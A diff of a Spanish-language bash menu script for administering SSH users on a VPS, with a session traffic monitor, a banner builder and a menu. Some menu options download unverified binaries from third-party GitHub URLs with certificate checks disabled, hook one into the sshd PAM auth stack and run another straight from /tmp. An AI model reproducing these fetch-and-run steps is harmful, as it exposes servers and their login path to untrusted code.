+*)
+echo "LO SENTIMOS DIGITASTE MAL"
+sleep 0.1s
+return 0
+;;
+esac
+#TERMINA CASE
+}
+monitoreo_en_vivo() {
+    local refresh=10
+    local factor=2.11          # ← ¡AJUSTADO EXACTAMENTE PARA TU CASO!
+
+    trap "break" INT
+    echo -e "${cor[3]}Iniciando monitoreo SSH - CONSUMO ESTIMADO CELULAR...${reset}"
+
+    while true; do
+        clear
+        echo -e "${cor[2]}====================================================${reset}"
+        echo -e "${cor[3]}  MONITOR SSH - CONSUMO ESTIMADO CELULAR - $(date '+%H:%M:%S') [80→22]${reset}"
+        echo -e "${cor[2]}====================================================${reset}"
+        echo -e "${cor[4]}USUARIO     | CONSUMO CELULAR  | TIEMPO${reset}"
+        echo -e "${cor[2]}----------------------------------------------------${reset}"
+
+        local count=0
+
+        while IFS= read -r line; do
+            [[ -z "$line" ]] && continue
+
+            read -r pid user etime <<< "$line"
+
+            # Tráfico total bruto
+            local total_bytes=0
+            if [[ -r "/proc/$pid/io" ]]; then
+                r=$(awk '/rchar:/{print $2}' "/proc/$pid/io" 2>/dev/null || echo 0)
+                w=$(awk '/wchar:/{print $2}' "/proc/$pid/io" 2>/dev/null || echo 0)
+                total_bytes=$((r + w))
+            fi
+
+            # Corrección para celular
+            local estimated=$(awk -v t="$total_bytes" -v f="$factor" 'BEGIN {printf "%d", t / f}')
+
+            # Formato MB/GB
+            local consumo
+            if (( estimated >= 1073741824 )); then
+                consumo=$(awk -v b=$estimated 'BEGIN {printf "%.2f GB", b/1073741824}')
+            elif (( estimated >= 1048576 )); then
+                consumo=$(awk -v b=$estimated 'BEGIN {printf "%.2f MB", b/1048576}')
+            else
+                consumo=$(awk -v b=$estimated 'BEGIN {printf "%.2f KB", b/1024}')
+            fi
+
+            # Tiempo preciso
+            local time_fmt=$(echo "$etime" | awk -F'[-:]' '
+            {
+                if (NF==4) printf "%dd %02dh %02dm %02ds", $1,$2,$3,$4
+                else if (NF==3) printf "%02dh %02dm %02ds", $1,$2,$3
+                else if (NF==2) printf "%02dm %02ds", $1,$2
+                else printf "%ds", $1
+            }')
+
+            printf "${cor[1]}%-11s${reset} | %-16s | %s\n" \
+                "$user" "$consumo" "$time_fmt"
+
+            ((count++))
+        done < <(ps -eo pid,user,etime,command | grep '[s]shd:' | grep -v root | awk '{print $1 " " $2 " " $3}')
+
+        [[ $count -eq 0 ]] && echo -e "   ${cor[1]}Sin conexiones activas${reset}"
+
+        echo -e "${cor[2]}----------------------------------------------------${reset}"
+        echo -e "${cor[1]}Factor: $factor • Actualiza cada ${refresh}s • Ctrl+C para salir${reset}"
+        sleep $refresh
+    done
+}
+menu_bannCheck(){
+msg -bar3
+local pat=$(grep "PandaHL001" /etc/pam.d/sshd)
+[[ -z ${pat} ]] && local _pic="\e[32m ACTIVAR" || local _pic="\e[31mAPAGAR" 
+print_center '\e[97m\033[1;41m MENUS DE CONTROL CHECKBANNER\033[0m' 
+#\033[0;33m(#EXPERIMENTAL)"
+menu_item " ${_pic} CheckBannerSSH (para HTTP Custom)"
+selection=$(selection_fun 1)
+case ${selection} in
+1)
+[[ ! -d /etc/ADMcgh/bin ]] && mkdir -p /etc/ADMcgh/bin
+
+[[ $(grep -c "^#PandaHL001 CheckBanner" /etc/pam.d/sshd) -eq 0 ]] && {
+  print_center -ama " Descargando binario CheckBanner...."
+
+  # 🔗 Descargar el binario único desde GitHub
+  if wget --no-check-certificate -t3 -T3 -O /etc/ADMcgh/bin/banner.bin https://raw.githubusercontent.com/karl1999x/PandaScript/main/PandaScript/Otros/banner.bin &>/dev/null; then
+    chmod +x /etc/ADMcgh/bin/banner.bin
+    msg -verd "Binario descargado [OK]"
+  else
+    msg -verm "[FAIL] No se pudo descargar el binario"
+  fi
+
+  # 📌 Agregar configuración a PAM
+  echo "#PandaHL001 CheckBanner
+auth required pam_unix.so
+auth optional pam_exec.so /etc/ADMcgh/bin/banner.bin
+auth optional pam_echo.so file=/etc/ADMcgh/bin/banner.txt
+# Fin de Compilacion Barred" >> /etc/pam.d/sshd
+
+  # 🔧 Comentar Banner en sshd_config si está presente
+  sshd_config="/etc/ssh/sshd_config"
+  if grep -q "^Banner" "$sshd_config"; then
+    sed -i 's/^Banner/#Banner/' "$sshd_config"
+    systemctl restart ssh
+  fi
+} || {
+  # 🔻 Si ya existía, limpiar binario y PAM
+  rm -f /etc/ADMcgh/bin/banner.bin
+  grep -v "^#PandaHL001 CheckBanner
+auth required pam_unix.so
+auth optional pam_exec.so /etc/ADMcgh/bin/banner.bin
+auth optional pam_echo.so file=/etc/ADMcgh/bin/banner.txt
+# Fin de Compilacion Barred" /etc/pam.d/sshd > /tmp/sshd && mv -f /tmp/sshd /etc/pam.d/sshd
+}
+
+# ✅ Reiniciar servicio SSH
+service ssh restart
+echo -e " SERVICIO COMPLETADO !!"
+;;
+2)[[ `grep -c "^#ChumoGH CheckBanner" /etc/pam.d/sshd` -eq 0  ]] && {
+print_center -ama " Descargando binario CheckBanner...."
+  [[ $(uname -m 2> /dev/null) != x86_64 ]] && {
+  if wget --no-check-certificate -t3 -T3 -O /etc/ADMcgh/bin/banner.bin https://raw.githubusercontent.com/ChumoGH/ADMcgh/main/BINARIOS/aarch64/out2.bin &>/dev/null ; then
+  chmod +x /etc/ADMcgh/bin/banner.bin
+  msg -verd "Universal [OK]"    
+  else    
+  msg -verm "[fail]" 
+  fi
+  } || {   
+  if wget --no-check-certificate -t3 -T3 -O /etc/ADMcgh/bin/banner.bin https://raw.githubusercontent.com/ChumoGH/ADMcgh/main/BINARIOS/x86_64/out2.bin &>/dev/null ; then
+  chmod +x /etc/ADMcgh/bin/banner.bin
+  msg -verd "ARM64 [OK]"    
+  else    
+  msg -verm "[fail]" 
+  fi
+  }
+echo "#ChumoGH CheckBanner
+auth required pam_unix.so
+auth optional pam_exec.so /etc/ADMcgh/bin/banner.bin
+auth optional pam_echo.so file=/etc/ADMcgh/bin/banner.txt
+# Fin de Compilacion Barred" >> /etc/pam.d/sshd
+sshd_config="/etc/ssh/sshd_config"
+if grep -q "^Banner" "$sshd_config"; then
+    sed -i 's/^Banner/#Banner/' "$sshd_config"
+    systemctl restart ssh
+fi
+} || {
+rm -f /etc/ADMcgh/bin/banner.bin
+grep -v "^#ChumoGH CheckBanner
+auth required pam_unix.so
+auth optional pam_exec.so /etc/ADMcgh/bin/banner.bin
+auth optional pam_echo.so file=/etc/ADMcgh/bin/banner.txt
+# Fin de Compilacion Barred" /etc/pam.d/sshd > /tmp/sshd && mv -f /tmp/sshd /etc/pam.d/sshd
+
+}
+service ssh restart
+echo -e " SERVICIO COMPLETADO !!"
+;;
+0)return 0 ;;
+esac
+}
+txt_font () {
+echo -e "\n\033[1;31m[\033[1;36m01\033[1;31m]\033[1;33m Letra Pequeña"
+echo -e "\033[1;31m[\033[1;36m02\033[1;31m]\033[1;33m Letra Media"
+echo -e "\033[1;31m[\033[1;36m03\033[1;31m]\033[1;33m Letra Grande"
+echo -e "\033[1;31m[\033[1;36m04\033[1;31m]\033[1;33m Letra ExtraGrande"
+echo ""
+echo -ne "\033[1;32mEscoje el Tamaño de Letra\033[1;31m ?\033[1;37m : "; read opc
+if [[ "$opc" = "1" ]] || [[ "$opc" = "01" ]]; then
+_size='6'
+elif [[ "$opc" = "2" ]] || [[ "$opc" = "02" ]]; then
+_size='4'
+elif [[ "$opc" = "3" ]] || [[ "$opc" = "03" ]]; then
+_size='3'
+elif [[ "$opc" = "4" ]] || [[ "$opc" = "04" ]]; then
+_size='1'
+else
+_size='6'
+fi
+msg -bar3
+echo -ne "\033[1;37m"
+read -p " INGRESA TU MENSAJE : " ban_ner2
+msg -bar3
+unset x
+echo -e "\033[1;42m Deseas centrar el contenido del banner\033[0;33m  :v"
+echo ""
+echo -ne "\033[0;32m Responde [ s | n ] : " && read -e -i "s" x
+msg -bar3
+[[ "$x" = @(s|S|y|Y) ]] && echo -e '<p style="text-align: center;">' >> /etc/bannerssh
+echo -e " \033[1;31m[ 1 ]\033[1;33m > VERDE         \033[1;31m[ 9  ]\033[1;33m > AZUL PIZARRA OSCURO"
+echo -e " \033[1;31m[ 2 ]\033[1;33m > ROJO          \033[1;31m[ 10 ]\033[1;33m > MAGENTA"
+echo -e " \033[1;31m[ 3 ]\033[1;33m > AZUL          \033[1;31m[ 11 ]\033[1;33m > CHOCOLATE"
+echo -e " \033[1;31m[ 4 ]\033[1;33m > AMARILLO      \033[1;31m[ 12 ]\033[1;33m > VERDE CLARO"
+echo -e " \033[1;31m[ 5 ]\033[1;33m > PURPURA       \033[1;31m[ 13 ]\033[1;33m > GRIS"
+echo -e " \033[1;31m[ 6 ]\033[1;33m > Naranja       \033[1;31m[ 14 ]\033[1;33m > VERDE MAR"
+echo -e " \033[1;31m[ 7 ]\033[1;33m > Crema         \033[1;31m[ 15 ]\033[1;33m > CIAN OSCURO"
+echo -e " \033[1;31m[ 8 ]\033[1;33m > Cyano         \033[1;31m[ * ]\033[1;33m > Negro"
+read -p " Digite A Cor [ 1 ⇿ 15 ]: " ban_ner2_cor
+if [[ "$ban_ner2_cor" = "1" ]]; then
+echo '<h'$_size'><font color="green">' >> /etc/bannerssh
+elif [[ "$ban_ner2_cor" = "2" ]]; then
+echo '<h'$_size'><font color="red">' >> /etc/bannerssh
+elif [[ "$ban_ner2_cor" = "3" ]]; then
+echo '<h'$_size'><font color="blue">' >> /etc/bannerssh
+elif [[ "$ban_ner2_cor" = "4" ]]; then
+echo '<h'$_size'><font color="yellow">' >> /etc/bannerssh
+elif [[ "$ban_ner2_cor" = "5" ]]; then
+echo '<h'$_size'><font color="purple">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "6" ]; then
+echo '<h'$_size'><font color="#FF7F00">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "7" ]; then
+echo '<h'$_size'><font color="#AEB404">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "8" ]; then
+echo '<h'$_size'><font color="cyan">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "9" ]; then
+echo '<h'$_size'><font color="#483D8B">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "10" ]; then
+echo '<h'$_size'><font color="#FF00FF">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "11" ]; then
+echo '<h'$_size'><font color="#D2691E">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "12" ]; then
+echo '<h'$_size'><font color="#90EE90">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "13" ]; then
+echo '<h'$_size'><font color="#BEBEBE">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "14" ]; then
+echo '<h'$_size'><font color="#2E8B57">' >> /etc/bannerssh
+elif [ "$ban_ner2_cor" = "15" ]; then
+echo '<h'$_size'><font color="#008B8B">' >> /etc/bannerssh
+else
+echo '<h'$_size'><font color="black">' >> /etc/bannerssh
+fi
+echo "$ban_ner2" >> /etc/bannerssh
+echo "</h"$_size"></font>" >> /etc/bannerssh
+[[ "$x" = @(s|S|y|Y) ]] && echo "</p>" >> /etc/bannerssh
+}
+
+
+selection=$(selection_fun 15)
+case ${selection} in
+1)
+clean_check;fun_us
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+2)
+ clean_check;function_2
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+3)
+ clean_check;function_3
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+4)
+ clean_check;function_4
+
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+5)
+
+ clean_check;function_5
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+6)
+ Call.bannerSSH
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+7)
+ clean_check;buscar_usuario
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+8)
+ clean_check;block_user
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+9)
+ recuva1
+echo -ne "${cor[5]}"
+/etc/adm-lite/usercodes
+;;
+10)
+ clean_check;botusers
+ 
+/etc/adm-lite/usercodes
+;;
+11)
+wget -qO /tmp/checkUser https://github.com/joaquin1444/checkUser1/raw/main/checkUser && chmod +x /tmp/checkUser && /tmp/checkUser
+
+echo -ne "${cor[5]}"
+read -p " Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+12)
+clean_check;v2ray-socket
+echo -ne "${cor[5]}"
+/etc/adm-lite/usercodes
+;;
+13)
+verifi_fun
+
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+14)
+ clean_check;_usCHECK
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+15)
+ clean_check;net_meter
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes
+;;
+16) menu_consumo_acumulado
+echo -ne "${cor[5]}"
+read -p " ¡Enter, para volver!"
+/etc/adm-lite/usercodes;;
+esac
